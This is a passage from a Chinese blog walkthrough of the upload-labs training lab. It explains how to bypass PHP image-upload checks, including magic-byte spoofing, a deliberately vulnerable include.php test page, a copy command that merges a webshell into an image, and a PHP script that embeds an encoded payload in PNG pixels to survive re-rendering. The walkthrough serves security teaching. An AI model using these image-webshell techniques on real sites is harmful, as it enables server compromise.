invoke__">Express</span> (dbx)，文件头：CFAD12FEC5FD746F</span><br><span class="line"><span class="title function_ invoke__">Outlook</span> (pst)，文件头：<span class="number">2142444</span>E</span><br><span class="line">MS <span class="title function_ invoke__">Access</span> (mdb)，文件头：<span class="number">5374616E64617264204</span>A</span><br><span class="line"><span class="title function_ invoke__">WordPerfect</span> (wpd)，文件头：FF575043</span><br><span class="line"><span class="title function_ invoke__">Postscript</span> (eps.<span class="keyword">or</span>.ps)，文件头：<span class="number">252150532</span>D41646F6265</span><br><span class="line">Adobe <span class="title function_ invoke__">Acrobat</span> (pdf)，文件头：<span class="number">255044462</span>D312E</span><br><span class="line"><span class="title function_ invoke__">Quicken</span> (qdf)，文件头：AC9EBD8F</span><br><span class="line">Windows <span class="title function_ invoke__">Password</span> (pwl)，文件头：E3828596</span><br><span class="line">RAR <span class="title function_ invoke__">Archive</span> (rar)，文件头：<span class="number">52617221</span></span><br><span class="line"><span class="title function_ invoke__">Wave</span> (wav)，文件头：<span class="number">57415645</span></span><br><span class="line"><span class="title function_ invoke__">AVI</span> (avi)，文件头：<span class="number">41564920</span></span><br><span class="line">Real <span class="title function_ invoke__">Audio</span> (ram)，文件头：<span class="number">2E7261</span>FD</span><br><span class="line">Real <span class="title function_ invoke__">Media</span> (rm)，文件头：<span class="number">2E524</span>D46</span><br><span class="line"><span class="title function_ invoke__">MPEG</span> (mpg)，文件头：<span class="number">000001</span>BA</span><br><span class="line"><span class="title function_ invoke__">MPEG</span> (mpg)，文件头：<span class="number">000001</span>B3</span><br><span class="line"><span class="title function_ invoke__">Quicktime</span> (mov)，文件头：<span class="number">6</span>D6F6F76</span><br><span class="line">Windows <span class="title function_ invoke__">Media</span> (asf)，文件头：<span class="number">3026</span>B2758E66CF11</span><br><span class="line"><span class="title function_ invoke__">MIDI</span> (mid)，文件头：<span class="number">4</span>D546864</span><br></pre></td></tr></table></figure><p>因此，可以在文件前添加<code>GIF89a</code>来迷惑文件检测<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673778087346-92bc1307-babe-4ad4-b1c5-85473c31f677.png" alt="image.png"><br>添加之后上传，上传成功，但是这时候文件后缀是<code>.gif</code>格式，这道题要求的是上传图片马，因此到这里即可，我们可以测试一下是否可以使用。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>我们在本地创建一个<code>include.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后保存到<code>upload-labs</code>的目录下即可（与upload文件夹同级），保存之后，用antsword连接<br><code>http://你的ip/upload-labs/include.php?file=upload/文件名称</code>，如果可以连接则说明图片马上传成功。（注意，这道题上传的图片马会改名字，修改的名字在response传回时会显示）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673782519464-3fcd10b2-4cc6-4d71-9e53-2326825163ca.png" alt="image.png"></p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-12"><a href="#解法-12" class="headerlink" title="解法"></a>解法</h2><p><code>getimagesize()</code> 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 <code>FALSE</code> 并产生一条 <code>E_WARNING</code> 级的错误信息。<br>但是也可以使用修改文件头标准编码绕过，所以用和Pass-13相同步骤即可绕过。</p><h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-13"><a href="#解法-13" class="headerlink" title="解法"></a>解法</h2><p><code>$image_type = exif_imagetype($filename);</code><br><code>exif_imagetype()</code> 读取一个图像的第一个字节并检查其签名。<br>可以使用和前两题相同的操作来绕过。</p><h2 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h2><p>如果想要调用<code>exif_imagetype()</code>这个函数需要系统配置文件开启php_exif模块，即<code>php-ini</code>文件中搜索<code>php_exif</code>将行前的分号删除（分号在这个文件中是注释的含义）。</p><h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=<span class="variable">$UPLOAD_ADDR</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这道题使用的是图片二次渲染：<code>$im = imagecreatefromjpeg($target_path);</code>该函数接受单个参数<code>$filename</code>，该参数保存图像的名称。返回值：成功时此函数返回图像资源标识符，错误时返回<code>FALSE</code>。<br>首先先上传一个基础图片，上传之后得到的图片下载下来（拖出来），然后准备一个一句话木马文件制<br>作图片马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy  two-pass_rendering.jpg /b + webshell.php /a  muma.jpg</span><br></pre></td></tr></table></figure><p>其中/b代表二进制文件binary，放在图片后面，/a代表文字文件ascii<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673795643512-aeb192d4-a2ef-4a48-8579-807ce70a5b7d.png" alt="62eaa9b1448ffa349f6023a08923ab5.png"><br>生成之后上传，测试连接，但是发现无法连接，把图片用文本形式打开后发现php语句格式前面有缺失（缺少了<code>&lt;</code>），所以在webshell文件前面随便加上一点字符。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796220390-17042861-ee9a-49df-9b1f-081543b12e33.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796269910-ddbfd283-518b-4f3b-aa63-039cae915393.png" alt="image.png"><br>重新合成，发现这次格式不缺失了，但是这样传上去之后还是不行，查阅资料发现，<code>.jpg</code>文件和<code>.gif</code>不同，前者渲染的方式和后者渲染的方式不同，因此选择gif文件的操作难度更低。<br>相同步骤重新操作gif文件，合成之后上传，连接发现成功。</p><h2 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h2><p>先上传一个png图片，得到二次渲染后的图片，用010编辑器打开，对比两个文件二进制编码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807266042-10a77bfa-5273-4d5b-b77e-90108045a054.png" alt="image.png"><br>红色的是不同的，白色的是相同的，因此可以将一句话木马写在白色位置：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807548864-217eebd6-c513-4f93-88ad-db8b78867018.png" alt="image.png"><br>然后上传连接</p><h2 id="方法三（尝试）"><a href="#方法三（尝试）" class="headerlink" title="方法三（尝试）"></a>方法三（尝试）</h2><p>可以上传一png结尾的 jpg图片</p><h2 id="png-jpg-图片马制作"><a href="#png-jpg-图片马制作" class="headerlink" title="png jpg 图片马制作"></a>png jpg 图片马制作</h2><p>如果想使用<code>.png</code>文件可以使用以下代码生成图片：（这个代码好像在php8版本会报错）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span 